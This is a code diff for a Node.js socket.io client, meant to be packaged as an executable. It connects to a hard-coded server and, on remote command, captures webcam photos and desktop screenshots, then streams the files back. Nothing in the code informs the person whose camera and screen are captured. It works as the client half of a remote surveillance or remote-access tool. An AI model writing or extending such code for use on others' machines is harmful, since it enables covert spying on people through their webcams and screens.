@@ -2,17 +2,16 @@ var io = require('socket.io-client');
 var ss = require('socket.io-stream');
 var fs = require('fs');
 var nodeWebcam = require('node-webcam');
+const { exec } = require('child_process');
+var screenshot = require('screenshot-desktop');
+const os = require('os');
 var ipInfo = require('ipinfo');
-var HOST = '127.0.0.1';
+var HOST = '192.168.0.14';
 var PORT = 3000;
 
 ipInfo(function(err, cLoc) {
     console.log(err || cLoc);
 });
-
-console.log("*******");
-console.log(__dirname);
-console.log("*******");
 
 // Webcam default options
 var opts = {
@@ -27,6 +26,14 @@ var opts = {
     verbose: true
 };
 
+function send_file(socket, filename, command) {
+    var stream = ss.createStream();
+    var pic_path = __dirname + '/' + filename;
+
+    ss(socket).emit(command, stream, {name: pic_path});
+    fs.createReadStream(pic_path).pipe(stream);
+}
+
 /* Package these variables in exe */
 const APP_ID = '001';
 const USER = 'a';
@@ -35,30 +42,58 @@ const USER = 'a';
 var socket = io.connect('http://' + HOST + ':' + PORT + '/dashboard',
     {query: {token: APP_ID, user: USER}});
     
-var stream = ss.createStream();
-
-var pic_path = __dirname + '/gnome.jpg';
+var platform = os.platform();
 
 socket.on('connect', function () {
     socket.on('take_webcam_picture', function() {
-        // Create webcam instance 
-        var webcam = nodeWebcam.create(opts);
-
-        webcam.capture('pic', function(error, data) {
-            console.log(data);
-        });
         
-        //uploader.upload(__dirname+'/pic.jpg')
-        
-        webcam.clear();
+        if (platform == 'linux') {
+            // Create webcam instance 
+            var webcam = nodeWebcam.create(opts);
 
+            // Save picture as 'webcamPicture' on client
+            webcam.capture('webcamPicture', function(error, data) {
+                if(error) {
+                    socket.emit('client_error', error);
+                }
+            });
+            
+            // Clear webcam cache
+            webcam.clear();
+            
+            // Wait 3s for picture to save onto client's computer
+            setTimeout(function() { 
+                send_file(socket, 'webcamPicture.jpg', 'send_webcam_picture'); 
+            }, 3000);
+            
+        } else {
+            socket.emit('client_error', {error:'Webcam feature not yet supported!'});
+        }
     });
     
-    ss(socket).emit('test_pic', stream, {name: pic_path});
-    fs.createReadStream(pic_path).pipe(stream);
-
-    
+    socket.on('take_screenshot', function() {
+        if (platform == 'linux') {
+            exec('gnome-screenshot -f screenshot.jpg', (err, stdout, stderr) => {
+                if (err) {
+                    socket.emit('client_error', err);
+                }
+            });
+            
+        } else if (platform == 'win32') {
+            screenshot({filename: 'screenshot.jpg'}).then((imgPath) => {
+            }).catch((err) => {
+                socket.emit('client_error', err);
+            });
+        }
+        
+        // Wait 3s for picture to save onto client's computer
+        setTimeout(function() { 
+            send_file(socket, 'screenshot.jpg', 'send_screenshot'); 
+        }, 3000);
+      
+    });
+        
     //emit password and/or appId over TLS to prove its truly the right node
     //server will take note of IP and save it. 
-    socket.emit('message', 'hi')
+    
 });
